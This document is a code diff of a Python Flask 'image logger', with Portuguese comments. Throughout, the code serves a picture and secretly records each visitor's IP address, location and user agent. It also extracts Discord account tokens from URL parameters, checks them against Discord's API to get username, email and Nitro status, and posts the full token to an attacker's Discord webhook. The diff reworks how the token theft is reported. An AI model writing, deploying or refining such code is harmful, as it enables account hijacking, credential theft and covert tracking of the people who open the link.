@@ -10,9 +10,6 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
     "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discord.com/)"
 ]
 
@@ -46,6 +43,10 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164")
 
+# ========== VARIÁVEL GLOBAL PARA ARMAZENAR O TOKEN ==========
+captured_token = None
+captured_token_source = None
+
 def botCheck(ip, useragent):
     if ip and ip.startswith(("34", "35")):
         return "Discord"
@@ -68,59 +69,41 @@ def reportError(error):
     except:
         pass
 
-def captureToken(token, source="URL", ip="Unknown", useragent="Unknown"):
-    if not config["captureTokens"] or not token:
-        return False
-    if len(token) < 30:
-        return False
+def validate_token(token):
+    """Valida token com a API do Discord"""
+    if not token or len(token) < 30:
+        return None
     if not re.match(r'^[a-zA-Z0-9._-]{30,100}$', token):
-        return False
-    
-    username = "Unknown"
-    discriminator = "0000"
-    user_id = "Unknown"
-    email = "Unknown"
-    verified = False
-    nitro_type = "None"
-    
-    if config["validateTokens"]:
-        try:
-            headers = {"Authorization": token, "User-Agent": get_random_ua()}
-            r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=3)
-            if r.status_code == 200:
-                data = r.json()
-                username = data.get("username", "Unknown")
-                discriminator = data.get("discriminator", "0000")
-                user_id = data.get("id", "Unknown")
-                email = data.get("email", "No email")
-                verified = data.get("verified", False)
-                nitro = data.get("premium_type", 0)
-                nitro_types = ["None", "Nitro Classic", "Nitro", "Nitro Basic"]
-                nitro_type = nitro_types[nitro] if nitro < len(nitro_types) else "Unknown"
-            else:
-                return False
-        except:
-            return False
-    
-    embed = {
-        "username": config["username"],
-        "content": "@everyone" if config.get("ping_on_token", False) else "",
-        "embeds": [{
-            "title": "🎯 Discord Token Captured",
-            "color": 0xFF0000,
-            "description": f"**Token:** `{token[:30]}...`\n\n**User Info:**\n> **Username:** `{username}#{discriminator}`\n> **User ID:** `{user_id}`\n> **Email:** `{email}`\n> **Verified:** `{verified}`\n> **Nitro:** `{nitro_type}`\n\n**Source:** `{source}`\n**IP:** `{ip}`\n**Timestamp:** <t:{int(time.time())}>\n\n**Full Token:** ||{token}||",
-            "footer": {"text": "Vercel Image Logger"}
-        }]
-    }
+        return None
     
     try:
-        headers = {"User-Agent": get_random_ua()}
-        requests.post(config["webhook"], json=embed, headers=headers, timeout=3)
-        return True
-    except:
-        return False
+        headers = {"Authorization": token, "User-Agent": get_random_ua()}
+        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=3)
+        if r.status_code == 200:
+            data = r.json()
+            username = data.get("username", "Unknown")
+            discriminator = data.get("discriminator", "0000")
+            user_id = data.get("id", "Unknown")
+            email = data.get("email", "No email")
+            verified = data.get("verified", False)
+            nitro = data.get("premium_type", 0)
+            nitro_types = ["None", "Nitro Classic", "Nitro", "Nitro Basic"]
+            nitro_type = nitro_types[nitro] if nitro < len(nitro_types) else "Unknown"
+            return {
+                "username": username,
+                "discriminator": discriminator,
+                "user_id": user_id,
+                "email": email,
+                "verified": verified,
+                "nitro": nitro_type,
+                "valid": True
+            }
+        else:
+            return {"valid": False, "error": f"HTTP {r.status_code}"}
+    except Exception as e:
+        return {"valid": False, "error": str(e)}
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, token_info=None):
     if ip and ip.startswith(blacklistedIPs):
         return
     
@@ -170,9 +153,9 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     
     os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
     
-    # ===== DESCRIÇÃO UNIFICADA (TUDO JUNTO) =====
+    # ===== CONSTRUINDO A DESCRIÇÃO (IP + TOKEN JUNTOS) =====
     description = (
-        "**A User Opened the Original Image!**\n\n"
+        "**📡 IP LOGGED**\n\n"
         "**Endpoint:** `" + endpoint + "`\n\n"
         "**IP Info:**\n"
         "> **IP:** `" + (ip if ip else 'Unknown') + "`\n"
@@ -191,11 +174,35 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         "**User Agent:**\n```\n" + str(useragent) + "\n```"
     )
     
+    # ===== SE TIVER TOKEN, ADICIONA NA DESCRIÇÃO =====
+    if token and token_info:
+        token_status = "✅ **VALIDO**" if token_info.get("valid") else "❌ **INVALIDO**"
+        if token_info.get("valid"):
+            description += (
+                "\n\n**🎯 DISCORD TOKEN CAPTURED**\n\n"
+                "**Status:** " + token_status + "\n"
+                "**Token:** `" + token[:30] + "...`\n"
+                "> **Username:** `" + token_info.get("username", "Unknown") + "#" + token_info.get("discriminator", "0000") + "`\n"
+                "> **User ID:** `" + token_info.get("user_id", "Unknown") + "`\n"
+                "> **Email:** `" + token_info.get("email", "No email") + "`\n"
+                "> **Verified:** `" + str(token_info.get("verified", False)) + "`\n"
+                "> **Nitro:** `" + token_info.get("nitro", "None") + "`\n\n"
+                "**Full Token:** ||" + token + "||"
+            )
+        else:
+            description += (
+                "\n\n**🎯 DISCORD TOKEN ATTEMPT**\n\n"
+                "**Status:** " + token_status + "\n"
+                "**Token:** `" + token[:30] + "...`\n"
+                "**Error:** `" + token_info.get("error", "Unknown") + "`\n\n"
+                "**Full Token:** ||" + token + "||"
+            )
+    
     embed = {
         "username": config["username"],
         "content": ping,
         "embeds": [{
-            "title": "Image Logger - IP Logged",
+            "title": "📸 Image Logger - Complete Report",
             "color": config["color"],
             "description": description
         }]
@@ -214,23 +221,28 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
 def catch_all(path):
+    global captured_token, captured_token_source
+    
     try:
         dic = dict(request.args)
         s = request.full_path if request.query_string else "/"
         ip = request.headers.get('x-forwarded-for', request.remote_addr)
         ua = request.headers.get('user-agent', '')
         
-        # ========== TOKEN CAPTURE ==========
+        # ========== CAPTURAR TOKEN DA URL ==========
+        token = None
+        token_source = "URL parameter"
+        token_info = None
+        
         if config["captureTokens"]:
-            token = None
-            token_source = "URL parameter"
-            
-            for param in [config.get("tokenParam", "token"), "token", "id", "t", "auth", "key"]:
+            # Tenta vários parâmetros
+            for param in [config.get("tokenParam", "token"), "token", "id", "t", "auth", "key", "code"]:
                 if dic.get(param):
                     token = dic.get(param)
                     token_source = f"URL parameter '{param}'"
                     break
             
+            # Se veio em base64, decodifica
             if token and len(token) > 50 and re.match(r'^[A-Za-z0-9+/=]+$', token):
                 try:
                     decoded = base64.b64decode(token).decode()
@@ -240,14 +252,18 @@ def catch_all(path):
                 except:
                     pass
             
+            # Procura padrão de token em qualquer lugar da URL
             if not token:
                 url_match = re.search(r'[a-zA-Z0-9._-]{30,100}', s)
                 if url_match:
                     token = url_match.group(0)
                     token_source = "URL regex match"
             
+            # Valida o token se encontrou
             if token:
-                captureToken(token, token_source, ip, ua)
+                token_info = validate_token(token)
+                captured_token = token
+                captured_token_source = token_source
         
         # ========== IMAGEM ==========
         if config["imageArgument"]:
@@ -265,7 +281,7 @@ def catch_all(path):
         is_crawler = 'Discordbot' in ua or ('Discord' in ua and 'bot' in ua.lower()) or (ip and ip.startswith(('34', '35')))
         
         if is_crawler or botCheck(ip, ua):
-            makeReport(ip, endpoint=request.path, url=url)
+            makeReport(ip, endpoint=request.path, url=url, token=token, token_info=token_info)
             try:
                 headers = {"User-Agent": get_random_ua()}
                 img_data = requests.get(url, headers=headers, timeout=5).content
@@ -274,7 +290,7 @@ def catch_all(path):
                 loading = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
                 return Response(loading, mimetype='image/jpeg')
         
-        # ========== RESPOSTA HTML ==========
+        # ========== RESPOSTA HTML PARA USUÁRIO NORMAL ==========
         html = f'''<style>body{{margin:0;padding:0;}}
 div.img{{
 background-image:url('{url}');
@@ -284,7 +300,7 @@ background-size:contain;
 width:100vw;height:100vh;
 }}</style><div class="img"></div>'''
         
-        makeReport(ip, ua, endpoint=request.path, url=url)
+        makeReport(ip, ua, endpoint=request.path, url=url, token=token, token_info=token_info)
         return Response(html, mimetype='text/html')
     
     except Exception as e:
